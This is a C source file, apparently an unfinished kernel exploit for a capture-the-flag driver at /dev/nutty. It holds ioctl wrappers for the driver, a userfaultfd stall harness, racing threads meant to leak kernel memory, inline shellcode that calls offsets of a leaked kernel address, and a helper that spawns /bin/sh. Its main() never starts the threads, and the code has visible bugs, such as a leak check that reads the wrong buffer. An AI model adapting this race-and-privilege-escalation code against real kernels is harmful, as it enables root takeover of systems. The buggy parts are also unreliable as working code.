#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


// commands
#define DEV_PATH "/dev/nutty"   // the path the device is placed

// constants
char buf[0x200];
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
// (END utils)

/** nutty **/
// commands
#define NUT_CREATE 0x13371
#define NUT_DELETE 0x13372
#define NUT_SHOW 0x13373
#define NUT_APPEND 0x13374

// type
struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
};

// globals
uint count = 0;
void *faultmp = 0;
int nutfd;

// wrappers
int _create(int fd, uint size, uint csize, char *data){
  printf("[+] create: %lx, %lx, %p\n", size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  assert(count < 10);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data
  };
  return ioctl(fd, NUT_CREATE, &myreq);
}
int _show(int fd, uint idx, char *buf){
  printf("[+] show: %lx, %p\n", idx, buf);
  assert(fd > 0);
  struct req myreq ={
    .idx = idx,
    .show_buffer = buf
  };
  return ioctl(fd, NUT_SHOW, &myreq);
}
void _delete(int fd, uint idx){
  printf("[+] delete: %x\n", idx);
  assert(fd > 0);
  struct req myreq = {
    .idx = idx,
  };
  return ioctl(fd, NUT_DELETE, &myreq);
}
int_append(int fd, uint idx, uint size, uint csize, char *data){
  printf("[+] append: %x, %x %x, %p\n", idx, size, csize, data);
  assert(fd > 0);
  assert(0<=size && size<0x400);
  assert(csize > 0);
  assert(count < 10);
  struct req myreq = {
    .size = size,
    .content_length = csize,
    .contents = data,
    .idx = idx
  };
  return ioctl(fd, NUT_APPEND, &myreq);
}
/** (END nutty) **/

/** uffd utils **/
// userfaultfd-utils
static void* fault_handler_thread(void *arg)
{
  puts("[+] entered fault_handler_thread");

  static struct uffd_msg msg;   // data read from userfaultfd
  struct uffdio_copy uffdio_copy;
  long uffd = (long)arg;        // userfaultfd file descriptor
  struct pollfd pollfd;         //
  int nready;                   // number of polled events

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  puts("[+] polling...");
  while(poll(&pollfd, 1, -1) > 0){
    if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
      errExit("poll");

    // read an event
    if(read(uffd, &msg, sizeof(msg)) == 0)
      errExit("read");

    if(msg.event != UFFD_EVENT_PAGEFAULT)
      errExit("unexpected pagefault");

    printf("[!] page fault: %p\n",msg.arg.pagefault.address);

    // Now, another thread is halting. Do my business.


    // forge user buffer passed into copy_from_user(), which doesn't take a lock cuz called in unlock_ioctl
    uffdio_copy.src = (ulong)faultmp;
    uffdio_copy.dst = (ulong)msg.arg.pagefault.address & ~(PAGE - 1);
    uffdio_copy.len = PAGE;
    uffdio_copy.mode = 0;
    if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");

    break;
  }

  puts("[+] exiting fault_handler_thrd");
}

void register_userfaultfd_and_halt(void)
{
  puts("[+] registering userfaultfd...");

  long uffd;      // userfaultfd file descriptor
  pthread_t thr;  // ID of thread that handles page fault and continue exploit in another kernel thread
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // create userfaultfd file descriptor
  printf("[-] calling userfaultfd...\n");
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
  printf("[-] called userfaultfd...\n");
  if(uffd == -1)
    errExit("userfaultfd");
  printf("[-] OK...\n");

  // enable uffd object via ioctl(UFFDIO_API)
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    errExit("ioctl-UFFDIO_API");

  // mmap
  puts("[+] mmapping...");
  faultmp = mmap(FAULT_ADDR, PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
  puts("[+] mmapped...");
  if(faultmp == MAP_FAILED)
    errExit("mmap");

  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
  uffdio_register.range.start = faultmp;
  uffdio_register.range.len = PAGE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    errExit("ioctl-UFFDIO_REGISTER");

  s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  if(s!=0){
    errno = s;
    errExit("pthread_create");
  }

  puts("[+] registered userfaultfd");
}
// (END userfaultfd-utils)

int leaked = -1;

static void* deleter(void *arg){
  while(leaked != -1){
    _delete(nutfd, 0);
  }
  puts("[+] deleter returning...");
  open("/proc/self/stat", O_RDONLY);
}

static void* shower(void *arg){
  char rbuf[0x200];
  int result;
  while(leaked != -1){
    result = _show(nutfd, 0, buf);
    if(result < 0)
      continue;
    if(((ulong*)rbuf)[0] != 0x41414141){
      leaked = 1;
      puts("[!] LEAKED!");
      for(int ix=0; ix!=4;++ix){
        printf("[!] 0x%lx\n", ((ulong*)rbuf)[ix]);
      }
      break;
    }
  }
  puts("[+] shower returning...");
}

static void* appender(void *arg){
  while(leaked != -1){
    _append(nutfd, 0, 0x80, 0x20, buf);
  }
  puts("[+] shower returning...");
}

static void* creater(void *arg){
  while(leaked != -1){
    _create(nutfd, 0x80, 0x20, buf);
  }
  puts("[+] creater returning...");
} 

/** (END uffd utils) **/

int main(int argc, char *argv[]) {
  pthread_t creater_thr, deleter_thr;
  memset(buf, 'A', 0x20);
  nutfd = open(DEV_PATH, O_RDWR);
  assert(nutfd > 0);

  for(int ix=0; ix!=128; ++ix){
    int tmpfd = open("/proc/self/stat", O_RDONLY);
    assert(tmpfd > 0);
  }

  //// register them
  //int creater_fd = pthread_create()
  //creater_fd = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  //if(s > 0)
  //  errEXit("creater_fd");
  //int deleter_fd = pthread_create()
  //creater_fd = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd);
  //if(s > 0)
  //  errEXit("creater_fd");

  return 0;
}
